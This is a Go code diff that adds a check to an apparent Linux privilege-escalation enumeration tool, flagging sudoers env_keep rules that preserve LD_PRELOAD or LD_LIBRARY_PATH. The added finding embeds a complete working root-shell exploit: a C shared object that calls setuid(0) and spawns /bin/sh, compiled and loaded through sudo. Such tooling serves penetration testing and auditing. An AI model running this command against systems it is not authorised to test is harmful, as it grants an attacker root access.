@@ -26,6 +26,7 @@ func (s *SudoCheck) Detect(c *Context) []Finding {
 func parseSudoListing(out string) []Finding {
 	const checkName = "sudo"
 	var findings []Finding
+	var allowedBins []string // sudo-runnable binaries seen, for the env_keep route
 	for _, raw := range strings.Split(out, "\n") {
 		line := strings.TrimSpace(raw)
 		if line == "" || !strings.Contains(line, ")") {
@@ -71,6 +72,7 @@ func parseSudoListing(out string) []Finding {
 			if !strings.HasPrefix(tok, "/") {
 				continue // skip args, env assignments, tags
 			}
+			allowedBins = append(allowedBins, tok)
 			tech, ok := lookupGTFO(tok)
 			if !ok || tech.Sudo == "" {
 				continue
@@ -93,5 +95,36 @@ func parseSudoListing(out string) []Finding {
 			})
 		}
 	}
+
+	// sudoers env_keep preserving LD_PRELOAD / LD_LIBRARY_PATH lets a sudo-run
+	// program load an attacker .so as root.
+	if hasEnvKeepPreload(out) {
+		bin := "<a-sudo-allowed-binary>"
+		if len(allowedBins) > 0 {
+			bin = allowedBins[0]
+		}
+		findings = append(findings, Finding{
+			Check:       checkName,
+			Title:       "sudo env_keep preserves LD_PRELOAD — load a root .so",
+			Category:    "sudo",
+			Confidence:  ConfMedium,
+			BlastRadius: BlastReversible,
+			Evidence:    "sudo -l shows env_keep with LD_PRELOAD/LD_LIBRARY_PATH",
+			Command:     "cat > /tmp/x.c <<'E'\n#include <stdlib.h>\n#include <unistd.h>\nvoid _init(){ setgid(0); setuid(0); execl(\"/bin/sh\",\"sh\",NULL); }\nE\ngcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\nsudo LD_PRELOAD=/tmp/x.so " + bin,
+			Reference:   "https://gtfobins.github.io/  (LD_PRELOAD technique); sudoers env_keep misconfig",
+		})
+	}
 	return findings
+}
+
+// hasEnvKeepPreload reports whether `sudo -l` output preserves LD_PRELOAD or
+// LD_LIBRARY_PATH via env_keep.
+func hasEnvKeepPreload(out string) bool {
+	for _, line := range strings.Split(out, "\n") {
+		if strings.Contains(line, "env_keep") &&
+			(strings.Contains(line, "LD_PRELOAD") || strings.Contains(line, "LD_LIBRARY_PATH")) {
+			return true
+		}
+	}
+	return false
 }
